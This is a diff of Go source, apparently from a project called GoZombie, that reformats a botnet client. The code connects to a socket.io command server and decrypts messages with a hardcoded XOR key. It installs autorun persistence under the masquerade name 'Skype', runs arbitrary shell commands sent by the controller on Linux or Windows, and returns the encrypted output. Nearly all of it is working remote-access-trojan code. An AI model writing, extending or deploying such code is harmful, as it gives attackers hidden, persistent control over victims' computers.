@@ -4,15 +4,15 @@ import (
 	//"bufio"
 	"bytes"
 	"fmt"
-	"github.com/UPSJustin/GoZombie/zsupport" //support functions
-	"github.com/UPSJustin/GoZombie/xor" //xor ftw
+	"github.com/UPSJustin/GoZombie/xor"          //xor ftw
+	"github.com/UPSJustin/GoZombie/zsupport"     //support functions
 	"github.com/zhouhui8915/go-socket.io-client" //websockets
 	"log"
 	"os"
 	"os/exec"
 	"runtime"
 	"strings"
-//	"syscall"
+	//	"syscall"
 )
 
 var (
@@ -20,14 +20,10 @@ var (
 	zombieName                string = "Skype"
 )
 
-
-
-
-
 func main() {
 	//Key for XOR Encryption
 	key := "KCQ"
-    
+
 	zsupport.OutMessage("Starting Cain")
 
 	opts := &socketio_client.Options{
@@ -55,14 +51,13 @@ func main() {
 
 	})
 
-
 	client.On("jnkcyp", func(msgs string) {
 		msg := xor.EncryptDecrypt(msgs, key)
 		zsupport.OutMessage("DEBUG: " + fmt.Sprint(msg))
 
 		if strings.Contains(msg, "persistence") {
 
-		zsupport.RegisterAutoRun(zombieName, fullPathBotSourceExecFile)
+			zsupport.RegisterAutoRun(zombieName, fullPathBotSourceExecFile)
 
 		}
 
@@ -71,11 +66,10 @@ func main() {
 
 			output := strings.SplitN(msg, "exec: ", 2)
 
-
 			if runtime.GOOS != "windows" {
 
 				cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf(`%s`, output[1]))
-				
+
 				cmdOutput := &bytes.Buffer{}
 				cmd.Stdout = cmdOutput
 				err := cmd.Run()
@@ -85,18 +79,17 @@ func main() {
 				encryptmsg := xor.EncryptDecrypt(string(cmdOutput.Bytes()), key)
 				client.Emit("jnkcyp", encryptmsg)
 
-			}else {
-				
+			} else {
+
 				//execute windows shell
-				
-				output := fmt.Sprintf(`%s`, output[1])
 
-			encryptmsg := zsupport.ExecWindows(output)
+			
 
-				client.Emit("jnkcyp", encryptmsg)			
-}
+				var encryptmsg string =  zsupport.ExecWindows(fmt.Sprintf(`%s`, output[1]))
+
+				client.Emit("jnkcyp", encryptmsg)
+			}
 		}
-		
 
 	})
 
@@ -112,7 +105,7 @@ func main() {
 
 		//command := string(data)
 
-  		//encrypted := xor.EncryptDecrypt(command, key)
+		//encrypted := xor.EncryptDecrypt(command, key)
 
 		//client.Emit("jnkcyp", encrypted)
 		//log.Printf("send message:%v\n", encrypted)
